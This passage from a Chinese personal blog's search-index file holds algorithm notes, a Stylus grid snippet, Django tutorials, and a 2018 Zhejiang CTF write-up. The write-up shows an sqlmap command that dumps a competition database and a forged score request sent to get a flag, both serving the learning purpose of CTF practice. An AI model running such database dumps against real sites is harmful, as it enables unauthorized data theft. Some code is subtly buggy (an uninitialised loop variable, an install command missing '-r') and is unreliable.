  for (int i; i &lt; n; i++) &#123;
    if (i !== u0) &#123;
      lowcost[i] = c[u0][i]    //最近权为到u0的权
      closet[i] = u0    //最近点为u0
      s[i] = false    //不在U内
    &#125; else &#123;
      lowcost[i] = 0
    &#125;
  &#125;
  for (int i = 1; i &lt; n; i++) &#123;
    int temp = INF    //权
    int t = u0
    for (int j = 1; j &lt; n; j++) &#123;
      if ((!s[j]) &amp;&amp; (lowcost[j] &lt; temp)) &#123;    //不在U内且权更小
        t = j
        temp = lowcost[j]
      &#125;
    &#125;
    if (t === u0)    //找不到最小路径点
      break
    s[t] = true    //加入U
    //更新lowcost和closet
    for (int j = 1; j &lt;= n; j++) &#123;
      if ((!s[j]) &amp;&amp; (c[t][j] &lt; lowcost[j])) &#123;    //不在U内且t到j的权小于最短权
        lowcost[j] = c[t][j]
        closest[j] = t
      &#125;
    &#125;
  &#125;
  //最小费用为lowcost之和
&#125;</code></pre>
<h3 id="排序算法比较"><a href="#排序算法比较" class="headerlink" title="排序算法比较"></a>排序算法比较</h3><table>
<thead>
<tr>
<th align="center">排序方式</th>
<th align="center">平均情况</th>
<th align="center">辅助空间</th>
<th align="center">稳定性</th>
</tr>
</thead>
<tbody><tr>
<td align="center">冒泡排序</td>
<td align="center">O(n<sup>2</sup>)</td>
<td align="center">O(1)</td>
<td align="center">稳定</td>
</tr>
<tr>
<td align="center">选择排序</td>
<td align="center">O(n<sup>2</sup>)</td>
<td align="center">O(1)</td>
<td align="center">不稳定</td>
</tr>
<tr>
<td align="center">插入排序</td>
<td align="center">O(n<sup>2</sup>)</td>
<td align="center">O(1)</td>
<td align="center">稳定</td>
</tr>
<tr>
<td align="center">希尔排序</td>
<td align="center">O(nlogn)</td>
<td align="center">O(1)</td>
<td align="center">不稳定</td>
</tr>
<tr>
<td align="center">快速排序</td>
<td align="center">O(nlogn)</td>
<td align="center">O(nlogn)</td>
<td align="center">不稳定</td>
</tr>
<tr>
<td align="center">归并排序</td>
<td align="center">O(nlogn)</td>
<td align="center">O(n)</td>
<td align="center">稳定</td>
</tr>
<tr>
<td align="center">堆排序</td>
<td align="center">O(nlogn)</td>
<td align="center">O(1)</td>
<td align="center">不稳定</td>
</tr>
<tr>
<td align="center">桶排序</td>
<td align="center">O(n+c)</td>
<td align="center">O(1)</td>
<td align="center">不稳定</td>
</tr>
<tr>
<td align="center">基数排序</td>
<td align="center">O(nlog(r)m)</td>
<td align="center">O(r)</td>
<td align="center">稳定</td>
</tr>
</tbody></table>
<h3 id="渐进复杂度"><a href="#渐进复杂度" class="headerlink" title="渐进复杂度"></a>渐进复杂度</h3><table>
<thead>
<tr>
<th align="center">3n<sup>2</sup>+10n</th>
<th align="center">n<sup>2</sup>/10+2<sup>n</sup></th>
<th align="center">21+1/n</th>
<th align="center">logn<sup>3</sup></th>
<th align="center">10log3<sup>n</sup></th>
</tr>
</thead>
<tbody><tr>
<td align="center">O(n<sup>2</sup>)</td>
<td align="center">O(2<sup>n</sup>)</td>
<td align="center">O(1)</td>
<td align="center">O(logn)</td>
<td align="center">O(n)</td>
</tr>
</tbody></table>
<p>2 &lt; logn &lt;n<sup>2/3</sup> &lt; 20n &lt; 4n<sup>2</sup> &lt; 3<sup>n</sup> &lt; n!</p>
<ul>
<li>f(n)的阶 &lt;= g(n)的阶    =&gt;    f(n)=O(g(n))</li>
<li>f(n)的阶 &gt;= g(n)的阶    =&gt;    f(n)=Ω(g(n))</li>
<li>f(n) == g(n)    =&gt;    f(n)=θ(g(n))</li>
</ul>
<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><h5 id="算法特性"><a href="#算法特性" class="headerlink" title="算法特性"></a>算法特性</h5><ul>
<li>有穷性：算法的有穷性是指算法必须能在执行有限个步骤之后终止。</li>
<li>确定性：算法的每一步骤必须有确切的定义。</li>
<li>可行性：算法中执行的任何计算步骤都是可以被分解为基本的可执行的操作步，即每个计算步都可以在有限时间内完成。</li>
<li>输入输出：有0个或多个输入，有1个或多个输出。</li>
</ul>
<h5 id="好算法标准"><a href="#好算法标准" class="headerlink" title="好算法标准"></a>好算法标准</h5><p><code>高效率，低存储。</code></p>
<p>正确性、易读性、健壮性、高效性、低存储性</p>
<h3 id="分支限界法"><a href="#分支限界法" class="headerlink" title="分支限界法"></a>分支限界法</h3><h5 id="分支限界法与回溯法的区别"><a href="#分支限界法与回溯法的区别" class="headerlink" title="分支限界法与回溯法的区别"></a>分支限界法与回溯法的区别</h5><ul>
<li><p>二者都是在问题的解空间数上搜索问题解的算法。</p>
</li>
<li><p>分支限界法采用广度优先或最小耗费优先方式生成解空间；回溯法采用深度优先方式生成解空间。</p>
</li>
<li><p>分支界限法一般用于求最优解；回溯法一般用于求全部解。</p>
</li>
<li><p>分支界限法需要额外辅助空间；回溯法不需要。</p>
</li>
</ul>
<h5 id="队列式与优先队列式的区别"><a href="#队列式与优先队列式的区别" class="headerlink" title="队列式与优先队列式的区别"></a>队列式与优先队列式的区别</h5><ul>
<li>队列式：将活结点组织成一个队列，按先进先出原则选取下一个节点。</li>
<li>优先队列式：将活结点组织成一个优先队列，按优先级最高原则选取下一个节点。</li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>Stylus - 实现栅格化</title>
    <url>/2019/12/20/stylus-grid/</url>
    <content><![CDATA[<p>使用CSS预处理工具<code>Stylus</code>实现类似<code>BootStrap</code>中的栅格化功能。</p>
<span id="more"></span>

<p>最近在开发一个博客主题，需要实现栅格化。</p>
<p>首先想到的就是<code>BootStrap</code>，二话不说引了进来，等等……</p>
<p>我的初衷是倾尽全力设计一个简洁的博客主题，代码也必须简洁，所以就仿照<code>BootStrap</code>，用<code>Stylus</code>实现了栅格化功能。</p>
<p>几行代码，取代了长篇大论的<code>BootStrap</code>。</p>
<p>食用方法同<code>BootStrap</code>。</p>
<pre><code class="stylus">// Grid
.row
  display -ms-flexbox
  display flex
  -ms-flex-wrap wrap
  flex-wrap wrap
for $i in 1 .. 12
  .col-&#123;$i&#125;, .col-md-&#123;$i&#125;, .col-lg-&#123;$i&#125;
    position relative
    width 100%
    padding-right 15px
    padding-left 15px
    @media (max-width: 576px)
      padding-right 0
      padding-left 0
col-attr()
  -ms-flex 0 0 arguments
  flex 0 0 arguments
  max-width arguments
for $i in 1 .. 12
  .col-&#123;$i&#125;
    col-attr round(($i * 100 / 12) %, 6)
@media (min-width: 576px)
  for $i in 1 .. 12
    .col-sm-&#123;$i&#125;
      col-attr round(($i * 100 / 12) %, 6)
@media (min-width: 768px)
  for $i in 1 .. 12
    .col-md-&#123;$i&#125;
      col-attr round(($i * 100 / 12) %, 6)
@media (min-width: 992px)
  for $i in 1 .. 12
    .col-lg-&#123;$i&#125;
      col-attr round(($i * 100 / 12) %, 6)</code></pre>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>浙江省首届网络安全大赛题解</title>
    <url>/2018/11/05/zjctf-wirteup/</url>
    <content><![CDATA[<p>2018年浙江首届网络安全大赛题解。我们队都是野路子小白帽，抱着玩一玩的心态参赛，运气好拿了个一等奖（第六名）。</p>
<span id="more"></span>

<h1 id="决赛"><a href="#决赛" class="headerlink" title="决赛"></a>决赛</h1><h3 id="1-1-知法懂法"><a href="#1-1-知法懂法" class="headerlink" title="1-1 知法懂法"></a>1-1 知法懂法</h3><ol>
<li><p>在输入框提交数字，可以看到返回相应的网络法，同时URL的get请求中提交了两个字段id和submit。输入一些SQL注入语句可判断存在SQL注入点。</p>
</li>
<li><p>URL丢到SQLMap跑一下，注入成功，数据库成功脱库。</p>
</li>
</ol>
<pre><code>sqlmap -u &quot;http://172.21.1.102:61234/XYRM8AGv29?id=1&amp;Submit=%E6%90%9C%E7%B4%A2&quot; -a</code></pre><ol start="3">
<li><p>脱库后可以查到8个数据表，其中1个表存着七章网络法标题，另外7个表存着相应的七章安全法内容。</p>
</li>
<li><p>写脚本提交了5位数内的数字，都没任何返回值。因此判断flag可能不存在数据库中，而是写死在PHP中。</p>
</li>
<li><p>折腾了好久未果。最后仔细读了下题目，发现题目说，找到不是网络安全法的内容，内容！然后认真阅读了一次记录中的安全法，发现有一条讲的是未成年人保护法，提交这段内容，得到flag。<br>小结：用工具无脑注入即可脱库，之后的提交内容考验脑洞和细心。</p>
</li>
</ol>
<h3 id="1-2-回味童年"><a href="#1-2-回味童年" class="headerlink" title="1-2 回味童年"></a>1-2 回味童年</h3><ol>
<li><p>不管题目，先得玩一把俄罗斯方块，不能辜负出题人写了这么多代码。就是被工作人员围观玩游戏有点小尴尬。</p>
</li>
<li><p>将jar解压之后，用idea打开，先全文搜索一下zjctf之类的标识，发现并没有直接藏在里面。</p>
</li>
<li><p>查看目录，发现有一个HttpRequest.class文件，说明需要发送请求给后台才能获得flag。</p>
</li>
<li><p>因为HttpRequest.class文件里的函数是sendGet和sendPost，所以全文检索这两个方法，发现TetrisGame$ResultPanel.class文件中有一个sendGet。其代码如下：</p>
</li>
</ol>
<pre><code>String var4 = var2.getProperty(&quot;url&quot;);
this.pointsLabel.setText(Integer.toString(this.points) + var1);
long var5 = System.currentTimeMillis();
String var7 = Long.toString(var5);
Encoder var8 = Base64.getEncoder();
byte[] var9 = var8.encode(Integer.toString(this.points).getBytes());
String var10 = new String(var9);
String var11 = HttpRequest.sendGet(var4, var7 + &quot;&amp;&quot; + var10);
System.out.println(var11);</code></pre><p>发现发送的格式是url？时间戳&amp;分数的base64编码。</p>
<ol start="5">
<li><p>根据var4一路回溯，找到url来自config.properties文件，打开一看，就是目标url了。</p>
</li>
<li><p>然后复制HttpRequrst,class中的代码，写脚本来按格式发送过去，就可以得到flag。<br>代码如下：</p>
</li>
</ol>
<pre><code>int points = 20180;
Encoder var8 = Base64.getEncoder();
byte[] var9 = var8.encode(Integer.toString(points).getBytes());
String var10 = new String(var9);
long var5 = System.currentTimeMillis();
String var7 = Long.toString(var5);
String var11 = HttpRequest.sendGet(&quot;http://172.21.1.102:61234/Gb9k0TPyqz&quot;, var5 + &quot;&amp;&quot; + var10);
System.out.println(var11);</code></pre><h3 id="2-1-圆圈圈圆"><a href="#2-1-圆圈圈圆" class="headerlink" title="2-1 圆圈圈圆"></a>2-1 圆圈圈圆</h3><ol>
<li>用binwalk对下载的1.PNG进行分析,发现其中隐藏了一些文件。</li>
</ol>
<pre><code>binwalk 1.png</code></pre><ol start="2">
<li>用foremost提取到如下文件：<br>zip(00002888.zip)  rar(00000943.rar)  png(00000000.png)  ole(00001886.ole)  jpg(00001899.jpg)</li>
</ol>
<pre><code>foremost -v -i 1.png -o /root/aa</code></pre><ol start="3">
<li><p>打开rar文件，发现压缩包内包含了paper2.png图片，尝试解压，但需要密码无法解压。</p>
</li>
<li><p>用WinHex打开jpg文件，发现文件头包含”photoshop cs5”字样，尝试用photoshop打开该文件，寻找隐藏信息，未果。</p>
</li>
<li><p>用WinHex打开ole文件，发现十六进制内包含”microsoft office”等字样。同时用foremost提取到一些xml文件，初步判断是office的主题文件。</p>
</li>
<li><p>将ole文件后缀改为.doc得到word文件，发现可以打开，且存在ctf比赛介绍等内容。</p>
</li>
<li><p>用word自带的文本检查工具分析，发现存在作者信息和隐藏文字，在设置出开启隐藏文字选项。在文本末尾发现疑似flag,flag{This_i5_n0t_f1ag}。提交后发现flag不正确，从内容也可推测出不是真正的flag。</p>
</li>
</ol>
<p><img  src="https://pic.izhaoo.com/20181104224621.jpg"  ><span class="image-caption">flag</span></p>
<ol start="8">
<li><p>将flag{This_i5_n0t_f1ag}作为密钥用于解压之前的rar压缩包，发现可以解开，得到paper.png文件。</p>
</li>
<li><p>用NotePad打开paper.png，搜索”zj”字段，搜索得到真正的flag。</p>
</li>
</ol>
<p><img  src="https://pic.izhaoo.com/20181104224911.jpg"  ><span class="image-caption">zjflag</span></p>
<p>小结：jpg文件的photoshop信息有误导之嫌，一直把注意力放在这儿。之后无意间发现word有隐藏文字这个功能，才得到假flag。套路有点多。</p>
<h3 id="4-1-小猪佩奇"><a href="#4-1-小猪佩奇" class="headerlink" title="4-1 小猪佩奇"></a>4-1 小猪佩奇</h3><ol>
<li><p>用binwalk和foremost提取file.png文件，得到png和zip文件。</p>
</li>
<li><p>解压zip文件，得到一段peppa.mp3的音频和一张新的png图片。</p>
</li>
<li><p>再次对新的png图片进行提取，得到一堆文件，包含xml等，通过分析得出可能是office文件。</p>
</li>
<li><p>在其中的media文件夹中发现一张二维码图片，燃鹅，现场莫得带手机，扫不出二维码，难受。</p>
</li>
</ol>
<p><img  src="https://pic.izhaoo.com/20181104225719.jpg"  ><span class="image-caption">qrcode-ss</span></p>
<ol start="5">
<li>最后，突然想到神器ss内有扫描二维码功能，扫描二维码得password:APIG。</li>
</ol>
<p><img  src="https://pic.izhaoo.com/20181104225757.jpg"  ><span class="image-caption">qrcode-password</span></p>
<ol start="6">
<li><p>用goldwave打开之前的peppa.mp3音频文件，发现音频前0.3s的左声道有一段波形，大约可以猜测音频隐写了内容。燃鹅，没有准备音频隐写工具，几乎放弃。</p>
</li>
<li><p>到了中午，现场放出了一些常用工具，其中发现了mp3-stago工具。</p>
</li>
<li><p>下载工具，参考README.md说明，用之前解开的”APIG”密钥很顺利地对音频解密，得到flag。<br>小结：又是一道隐写题，难度不大。这题考的是工具，什么都没准备唉。还好现场放出了工具，顺利解开。</p>
</li>
</ol>
<h3 id="3-1-似曾相识（未解完）"><a href="#3-1-似曾相识（未解完）" class="headerlink" title="3-1 似曾相识（未解完）"></a>3-1 似曾相识（未解完）</h3><ol>
<li><p>小恐龙和预赛套路一样，post一个时间值，网页返回一张png图片。</p>
</li>
<li><p>得到png图片后，再将页面上的另外3张png下载，得到看似一样的四张png。</p>
</li>
<li><p>初步判断后发现，图片的大小有差异。用WinHex打开后，发现编码也有细微差异。</p>
</li>
<li><p>用compare比较两张图片，发现左半边有像素差异。同时发现下载的png图片文件名疑似md5加密。（红点标出部分）</p>
</li>
</ol>
<p><img  src="https://pic.izhaoo.com/ccc.png"  ><span class="image-caption">compare</span></p>
<ol start="5">
<li><p>由于赛场禁网无法在线查询md5密码，且为准备图片xor运算工具，所以未解出。</p>
</li>
<li><p>回来后将文件名丢到在线md5解密，得到密码为65594。</p>
</li>
</ol>
<p><img  src="https://pic.izhaoo.com/20181104212713.jpg"  ><span class="image-caption">md5</span></p>
<ol start="7">
<li><p>用stegsolve.jar工具对两张图片xor运算的到一张新的bmp图片。</p>
</li>
<li><p>用WinHex打开bmp图，发现大多数像素点十六进制为00（黑），有少部分为0A（灰）。将00表示为0，01表示为1，得到二进制串。</p>
</li>
</ol>
<p>小结：工具没准备好，知道怎么做，却做不出，唉。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本来就是抱着玩玩的心态参加了决赛，做了一上午0解，排在了四十多名有点难受。想着赶快做出个一题拿个三等奖就睡觉了。然后中午吃完盒饭，官方放出了一些工具的GitLab，用着工具一口气解出三题，瞬间爬到第四名，美滋滋。对于业余人士，拿到这个成绩还是很开心了，拿了奖牌回去继续苟前端。</p>
<p><img  src="https://pic.izhaoo.com/20181105155515.jpg"  ><span class="image-caption">yo</span></p>
<p><img  src="https://pic.izhaoo.com/20181218111105.jpg"  ><span class="image-caption">year</span></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Django - 自定义模板标签</title>
    <url>/2018/09/01/django-template-tags/</url>
    <content><![CDATA[<p>这几天一直在折腾Django的博客项目，今天本想着做完收尾工作就传到Gayhub上，没想到遇一大坑，各种填坑ing……</p>
<span id="more"></span>

<h1 id="挖坑"><a href="#挖坑" class="headerlink" title="挖坑"></a>挖坑</h1><p>先来简单介绍一下本人亲手挖的坑：</p>
<p>本博客项目<code>templates</code>中的所有页面都通过<code>block</code>标签继承自<code>base.html</code>母模板。其中继承了<code>&lt;title&gt;</code>、<code>&lt;keywords&gt;</code>、<code>&lt;discription&gt;</code>等内容。开发阶段这些内容都是直接写死在<code>base.html</code>母模板中了，现在准备上线，总不能让用户（假设有用户）去模板中改吧？所以我得将它写到数据库中，让用户可以在后台方便地设置博客的<code>名称</code>、<code>关键词</code>、<code>描述</code>等内容，各大博客也都是这么做的。燃鹅，事情并非那么简单，随之而来的是各种坑，作为处女座代码狗，我TM必须解决……</p>
<h1 id="填坑"><a href="#填坑" class="headerlink" title="填坑"></a>填坑</h1><p>尝试了各种方法之后，终于完美解决了问题。用到了自定义模板标签（simple_tag）这个方法。详细解释在后文（踩坑）中，这里只做演示：</p>
<p>在<code>index</code>应用中新建<code>index_tags.py</code>文件：</p>
<pre><code>from django import template    # 自定义模板是template类下的对象，所以先引入
from index.models import Setting

register = template.Library()    # 为对象起个别名

@register.simple_tag    # 定义标签的类型
def get_setting():    # 定义标签
    return Setting.objects.last()    # 标签的作用，返回Setting数据库的一条记录</code></pre><p>在<code>blog</code>项目下的<code>setting.py</code>中改写以下几行：</p>
<pre><code>TEMPLATES = [
    &#123;
        &#39;BACKEND&#39;: &#39;django.template.backends.django.DjangoTemplates&#39;,
        &#39;DIRS&#39;: [os.path.join(BASE_DIR, &#39;templates&#39;)],
        &#39;APP_DIRS&#39;: True,
        &#39;OPTIONS&#39;: &#123;
            &#39;context_processors&#39;: [
                &#39;django.template.context_processors.debug&#39;,
                &#39;django.template.context_processors.request&#39;,
                &#39;django.contrib.auth.context_processors.auth&#39;,
                &#39;django.contrib.messages.context_processors.messages&#39;,
            ],
            &#39;libraries&#39;: &#123;
                &#39;index_tags&#39;:  &#39;index.index_tags&#39;,    # 注册index_tags这个库
            &#125;
        &#125;,
    &#125;,
]</code></pre><p>在<code>base.html</code>开头写上以下两行：</p>
<pre><code>｛% load index_tags %｝    # 引入index_tags自定义库
｛% get_setting as setting %｝    # 使用get_setting自定义模板函数，并定义别名为setting</code></pre><p>然后我们就可以在<code>base.html</code>母模板中使用<code>&#123;&#123; setting.title &#125;&#125;</code>、<code>&#123;&#123; setting.keywords &#125;&#125;</code>、<code>&#123;&#123; setting.discription &#125;&#125;</code>动态渲染数据库中的内容了。</p>
<p>其他页面只需继承<code>base.html</code>页面即可。例如<code>文章页面</code>中，描述应该是该文章的摘要，我们就用<code>｛% block discription %｝ ｛% endblock %｝</code>重载母模板;而<code>标签页面</code>中，描述无需更改，那就什么都不做呗。</p>
<h1 id="一号坑，重写视图函数"><a href="#一号坑，重写视图函数" class="headerlink" title="一号坑，重写视图函数"></a>一号坑，重写视图函数</h1><p>最简单的思路就是在<code>views.py</code>中的各个<code>视图函数</code>中调取数据库，然后再渲染到各个模板中，模板中再通过<code>block</code>标签重写这部分内容。不行，上帝告诉我，不能这么做。一次次地调数据库，渲染模板，重写模板，页面渲染速度拉下一大截。Veto!</p>
<h1 id="二号坑，渲染母模板"><a href="#二号坑，渲染母模板" class="headerlink" title="二号坑，渲染母模板"></a>二号坑，渲染母模板</h1><p>稍微拐个弯，很自然的就能想到，我们只需要改写<code>base.html</code>母模板，动态渲染数据库中的内容即可。Yo, 看似很完美，Thinkphp中就可以用此方法完美解决。燃鹅，在Django中此路不通。因为Django的视图函数是接收到<code>request</code>请求后再进行后续的操作，我们的<code>base.html</code>是在模板中直接继承的，根本没有发送额外的请求，使用就不能单独的进行逻辑处理。Veto!！</p>
<pre><code>def archive(request):
    articles = Article.objects.order_by(&#39;-post_time&#39;).all()
    return render(request, &#39;archive.html&#39;, &#123;&#39;articles&#39;: articles&#125;)

# 例如这段代码是渲染文章内容的，可以看到必须要传入了一个请求（request）</code></pre><h1 id="三号坑，重写render方法"><a href="#三号坑，重写render方法" class="headerlink" title="三号坑，重写render方法"></a>三号坑，重写render方法</h1><p>终于百度到一条可行的解决方法，思路很清奇。重写Django框架中的render方法，让它能动态渲染<code>base.html</code>。确实很牛，从根本解决了问题，强烈建议Django官方填了这个坑。但是我这儿还是不想用，因为重写<code>render</code>方法之后我依然需要改动许多调用<code>render</code>的地方。Veto!!!</p>
<p><a href="https://www.cnblogs.com/helloxiaoyu/p/8559206.html">django解决其他页面继承不了base模板的动态数据的问题</a></p>
<h1 id="四号坑，伪造请求"><a href="#四号坑，伪造请求" class="headerlink" title="四号坑，伪造请求"></a>四号坑，伪造请求</h1><p>前面不是提到Django需要请求才能渲染页面嘛，<code>base.html</code>又不能传入请求。突然想到，我们直接伪造一个请求传进去不就好了。奇技淫巧，还是不想这么干。Veto!!!!</p>
<h1 id="五号坑，引入自定义模板标签"><a href="#五号坑，引入自定义模板标签" class="headerlink" title="五号坑，引入自定义模板标签"></a>五号坑，引入自定义模板标签</h1><p>终于，谷歌到了一个方法，引入自定义标签。简单解释一下，<code>base.html</code>在是可以使用模板标签的，像<code>｛% if %｝</code>、<code>｛% for %｝</code>这种。Django又提供了自定义模板标签，就是说我们可以自己造个模板标签，就叫<code>｛% get_setting %｝</code>吧，这个标签的功能就是从数据库获取<code>博客名称</code>、<code>博客关键词</code>（存在Setting这个数据表中）这些内容。<br>一切突然光明了~查了下官方文档，开始操作。</p>
<p>在<code>index</code>这个应用中新建一个<code>index_tags.py</code>文件：</p>
<pre><code># ！注意，此为错误示范

from django import template    # 自定义模板是template类下的对象，所以先引入
from index.models import Setting

register = template.Library()    # 为对象起个别名

@register.template_tags    # 定义标签的类型
def get_setting():    # 定义标签
    return Setting.objects.last()    # 标签的作用，返回Setting数据库的一条记录</code></pre><p>然后在<code>base.html</code>开头导入这个库：</p>
<pre><code>｛% load index_tags %｝</code></pre><p>然后就报错了：</p>
<pre><code>&#39;index_tags&#39; is not a registered tag library.</code></pre><p>什么鬼，照着官方文档的方法没错啊？逛了圈谷歌后才发现，原来在模板中引入自定义库前需要先到项目的<code>setting.py</code>中注册这个库。Django官方文档怎么没说啊啊啊。</p>
<p>打开<code>blog</code>项目下的<code>setting.py</code>文件，改写如下几行：</p>
<pre><code>TEMPLATES = [
    &#123;
        &#39;BACKEND&#39;: &#39;django.template.backends.django.DjangoTemplates&#39;,
        &#39;DIRS&#39;: [os.path.join(BASE_DIR, &#39;templates&#39;)],
        &#39;APP_DIRS&#39;: True,
        &#39;OPTIONS&#39;: &#123;
            &#39;context_processors&#39;: [
                &#39;django.template.context_processors.debug&#39;,
                &#39;django.template.context_processors.request&#39;,
                &#39;django.contrib.auth.context_processors.auth&#39;,
                &#39;django.contrib.messages.context_processors.messages&#39;,
            ],
            &#39;libraries&#39;: &#123;
                &#39;index_tags&#39;:  &#39;index.index_tags&#39;,    # 注册index_tags这个库
            &#125;
        &#125;,
    &#125;,
]</code></pre><h1 id="六号坑，不存在分配标签"><a href="#六号坑，不存在分配标签" class="headerlink" title="六号坑，不存在分配标签"></a>六号坑，不存在分配标签</h1><p>先说明一下，Django中有三种自定义标签，分别是：</p>
<ul>
<li>simple_tag (简单标签)  – 单次使用只能返回一层数据。在这里就是说，不能从数据库中返回一条记录作为实例再渲染，只能分别定义N个简单标签分别渲染N条字段。</li>
<li>inclusion_tag (内涵标签)  – 可以在标签中传入参数，这里没用。</li>
<li>assignment_tag (分配标签) – 使用标签时可以定义别名，作为一个实例，然后可以渲染这个实例的各个对象。在这里就是说可以直接定义一个分配标签，然后在模板中定义一个别名“setting”，然后用 分配渲染。</li>
</ul>
<p>承接上文，我们注册了<code>index_tags.py</code>这个库后终于可以在模板引入了。在模板中使用自定义标签<code>｛% get_setting %｝</code>。又报错了：</p>
<pre><code>AttributeError: &#39;Library&#39; object has no attribute &#39;assignment_tag&#39;</code></pre><p>什么鬼？找不到<code>assignment_tag</code>对象？？？还是照着官方的用法没错啊，网上也都是这个干的。走投无路，忍无可忍，翻了一下Django框架的源码。发现……<code>Django2</code>已经启用了<code>assignment_tag</code>和<code>inclusion_tag</code>标签，所有标签的功能都集中在了<code>simple_tag</code>上。想想也是啊，一个标签可以解决的事情，干嘛撑得用三个。Django官方改进功能值得表扬，但是你TM能不能顺便更新一下文档，您的最新文档不是误导我们嘛！差点气晕！Veto!!!!!!</p>
<p>填完各种天坑之后，终于完美解决了这个问题，头发掉了一大把，还是很开心。呵呵……呵呵呵……真是醉了……承接上文[填坑]</p>
]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>框架</tag>
        <tag>后端</tag>
      </tags>
  </entry>
  <entry>
    <title>Django - 搭建博客</title>
    <url>/2018/08/27/django-build-blog/</url>
    <content><![CDATA[<p>最近在学习Vue.js，需要后端配合返回Json，所以就顺便学习了一下Django，这里就记录一下搭建博客的全过程，作为起手式。由于之前用Thinkphp做过一个项目，所以对MVC(MTV)框架有了一点了解，Django就轻车熟路了，直接上手。这里就记个记个流水账，没学过的朋友直接照着敲就行了，敲完一定会有不少理解。</p>
<span id="more"></span>

<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ol>
<li>资源下载地址:<a href="https://pan.baidu.com/s/1aUI4MEi0T17CfCKCXWFl7g">项目文件</a>  <a href="https://pan.baidu.com/s/1nlCxZ0t93xPPflx01MBSTw">前端文件</a></li>
<li>文章中的<code>｛%</code>和<code>%｝</code>已经转义成了<code>&amp;#123;%</code>和<code>%&amp;#125;</code>，请自行更改。因为会和<code>hexo</code>的语法产生冲突，你看哈，我这里都得写成了中文的（其实是英文的），坑爹。</li>
</ol>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>我的操作系统是Win10，IDE是VSCode。先给VSCode安装几个插件:</p>
<ul>
<li>Python</li>
<li>Django Template</li>
</ul>
<p>然后我们需要安装Python，去官网下载最新版本，一路下一步即可，我装的是Python3.7。</p>
<p>Python安装后我们需要安装一个Virtualenv来创建虚拟环境。为什么呀创建虚拟环境呢？因为Python是基于模块来扩展功能的，我们完成一个项目会安装许多的扩展模块，项目一多不容易管理，且容易发生冲突，所以我们需</p>
<p>要创建一个虚拟环境将每个项目封装起来。<code>ctrl + ~</code>打开终端，输入以下指令：</p>
<pre><code>pip install virtualenv  #安装Virtualenv</code></pre><p>新建一个目录，我这叫<code>django_web</code>，cd到目录。</p>
<pre><code>virtualenv env  #创建env虚拟文件夹
env\Scripts\activate.bat  #激活虚拟环境</code></pre><p>在当前目录下新建<code>requirements.txt</code>文件，写入如下内容：</p>
<pre><code>django
pylint
pylint-django
autopep8</code></pre><p>django–Web开发框架，pylint–Python静态语法检测器,pylint-django– 适用于Django项目的语法检查插件，autopep8–代码格式化工具</p>
<pre><code>pip install requirements.txt  #安装以上模块</code></pre><h1 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h1><p>在<code>django_web</code>目录下输入以下指令：</p>
<pre><code>django-admin startproject blog  #创建blog项目

cd blog  #cd到blog目录

python manage.py startapp index  #创建index应用</code></pre><p>项目&amp;应用：</p>
<p>项目： 在这个项目中通俗的讲就是<code>博客项目（blog）</code>。一个项目中可以有许多功能独立的应用组成，最终完成整个系统。</p>
<p>应用： 在这个项目中通俗的讲有两个应用，分别是<code>前台（index）</code>和<code>后台（admin）</code>。应用是功能相对独立的一个模块，可以移植到不同的项目中。</p>
<p>在VSCode中按<code>Ctrl + Shift + P</code>，输入<code>工作区</code>，点击<code>工作区：打开工作区配置文件</code>，查看是否含有以下内容，没有的话做适当修改。</p>
<pre><code>    &quot;settings&quot;: &#123;
        &quot;python.pythonPath&quot;: &quot;$&#123;workspaceFolder&#125;\\env\\Scripts\\python.exe&quot;,
        &quot;python.linting.pylintPath&quot;: &quot;pylint&quot;,
        &quot;python.linting.pylintArgs&quot;: [
            &quot;--load-plugins&quot;, &quot;pylint_django&quot;
        ],
        &quot;python.formatting.autopep8Path&quot;: &quot;autopep8&quot;
    &#125;</code></pre><p>再次按下<code>Ctrl + Shift + P</code>，输入<code>Python</code>，点击<code>Python：选择解析器</code>，然后点击<code>Python3.7（virtualenv）</code>。即使用虚拟环境中的Python解析器。</p>
<p>至此，项目目录结构如下：</p>
<pre><code>django_web
  - env  #虚拟环境
  - blog
    -- manage.py  #Django的管理工具，可以运行web服务、管理数据库等工作。
    -- blog  #blog项目
      --- settings.py  #项目配置文件
      --- urls.py  #将URL模式映射到应用
      --- wsgi.py  #项目部署
    -- index  #index应用
      --- admin.py  #默认的后台管理程序
      --- apps.py  #应用的相关配置。
      --- models.py  #模型文件（model），用于配置ORM，设计数据库
      --- tests.py  #单元测试
      --- veiws.py  #视图文件（view），用于编写功能的主要处理逻辑</code></pre><h1 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h1><p>Django默认且自带<code>SQLite</code>数据库，对于这个小项目，使用<code>SQLite</code>足够了。如果你想使用其他数据库，如<code>MySQL</code>,请查阅相关文档   </p>
<p>打开<code>index</code>目录下的<code>model.py</code>，该文件用于定义数据库结构。</p>
<pre><code>from django.db import models

class Article(models.Model):
    title = models.CharField(max_length = 150)  #文章标题
    content = models.TextField()  #文章正文
    post_time = models.DateTimeField()  #文章创建时间
    views = models.IntegerField(default=0)  #文章访问量，初始化为0</code></pre><p>可以看到类名<code>Article</code>将作为数据库中的一张数据表，类中的每一条内容为一个字段，<code>=</code>后面的models的实例为字段的类型。</p>
<p>在<code>blog</code>目录下执行以下指令：</p>
<pre><code>python manage.py makemigrations blog  #将模型文件储存为迁移

python manage.py migrate  #通过迁移创建数据库</code></pre><p>现在，项目文件下会生成一个<code>db.sqlite3</code>文件，这个便是系统生成的数据库，可以使用SQLite管理工具打开。</p>
<h1 id="启动默认后台管理程序"><a href="#启动默认后台管理程序" class="headerlink" title="启动默认后台管理程序"></a>启动默认后台管理程序</h1><p>使用默认的后台管理程序，需要先创建账号。在<code>blog</code>目录下输入以下指令：</p>
